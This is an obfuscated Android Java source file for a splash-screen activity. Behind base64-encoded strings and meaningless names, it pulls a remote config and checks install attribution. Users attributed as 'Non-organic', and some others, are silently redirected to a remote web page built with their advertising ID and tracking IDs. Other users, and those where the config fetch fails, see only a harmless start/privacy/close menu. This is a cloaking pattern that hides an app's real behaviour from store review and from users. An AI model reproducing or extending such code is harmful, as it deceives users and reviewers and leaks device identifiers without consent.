package com.jjookker.sspllaash.itrfd;


import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class JS extends AppCompatActivity {

   static public WebView wewewew;
   @SuppressLint("StaticFieldLeak")
   static public Button buttSta,buttPol,buttClos;
   @SuppressLint("StaticFieldLeak")
   static public ProgressBar prodso;
   static boolean df = false;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.js);
        getWindow().addFlags(1024);

        Iushna.js = this;
        prodso = findViewById(R.id.prodso);
        buttSta = findViewById(R.id.buttSta);
        buttPol = findViewById(R.id.buttPol);
        buttClos = findViewById(R.id.buttClos);
        wewewew = findViewById(R.id.wewewew);
        MainActivity.rukd(this);

        if (OveStr.devye == 0){

            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    try {

                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(OveStr.yyyy(OveStr.iusa)).openConnection();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        String s = bufferedReader.readLine();
                        String [] a = s.split("\\\u007C");
                        OveStr.djsa = a[0];
                        OveStr.iubasqda = a[1];
                        OveStr.uyabq = a[2];

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                MainActivity.febbbdb(JS.this);
                                OveStr.iudahd = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(OveStr.yyyy("c2F2ZWRVcmw="), "poooo");
                                if (OveStr.iudahd.equals("poooo")) {
                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {

                                            if (OveStr.iuhbdw.equals(OveStr.yyyy("Tm9uLW9yZ2FuaWM="))){
                                                OveStr.iuuhw = OveStr.djsa + OveStr.uhhadq;
                                                startActivity(new Intent(JS.this,Wedsad.class));
                                                finishAffinity();
                                            }else if(OveStr.uyggwq != null) {
                                                OveStr.iuuhw = OveStr.djsa + OveStr.ytfqds;
                                                startActivity(new Intent(JS.this,Wedsad.class));
                                                finishAffinity();
                                            }else {
                                                if (OveStr.iubasqda.equals(OveStr.yyyy("Tk8="))) {
                                                    qqqq(JS.this);
                                                }else {
                                                    String strAppsFlyer = OveStr.iubasqda + OveStr.yyyy("P2J1bmRsZT0=") + getPackageName() + OveStr.yyyy("JmFkX2lkPQ==") + OveStr.ugwq + OveStr.yyyy("JmFwcHNfaWQ9") +
                                                            OveStr.ytvvq +  OveStr.yyyy("JmRldl9rZXk9") + OveStr.yyyy(OveStr.iuhd);
                                                    OveStr.iuuhw = OveStr.djsa + strAppsFlyer;
                                                    startActivity(new Intent(JS.this,Wedsad.class));
                                                    finishAffinity();
                                                }
                                            }
                                        }
                                    },5000);
                                }else {
                                    OveStr.iuuhw = OveStr.iudahd;
                                    startActivity(new Intent(JS.this,Wedsad.class));
                                    finishAffinity();

                                }

                            }
                        });

                    }catch (Exception e){
                        qqqq(JS.this);
                    }
                }
            }).start();
        }else {
            qqqq(this);
        }

    }

    public static void qqqq(JS js){
        prodso.setVisibility(View.INVISIBLE);
        buttSta.setVisibility(View.VISIBLE);
        buttPol.setVisibility(View.VISIBLE);
        buttClos.setVisibility(View.VISIBLE);
        sss(js);
        ppp();
        ccc(js);
    }

    public static void sss(JS js){
        buttSta.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                js.startActivity(new Intent(js.getApplicationContext(),MainActivity.class));

            }
        });
    }

    public static void ppp(){
        buttPol.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void onClick(View view) {
                df = true;
                wewewew.setVisibility(View.VISIBLE);
                buttSta.setVisibility(View.INVISIBLE);
                buttPol.setVisibility(View.INVISIBLE);
                buttClos.setVisibility(View.INVISIBLE);
                wewewew.loadUrl(OveStr.yyyy(OveStr.udud));
            }
        });
    }

    public static void ccc(JS js){
        buttClos.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                js.finishAffinity();
            }
        });
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        if (df == true){
        startActivity(new Intent(this,JS.class));
        finishAffinity();
        }
        df = false;

    }
}
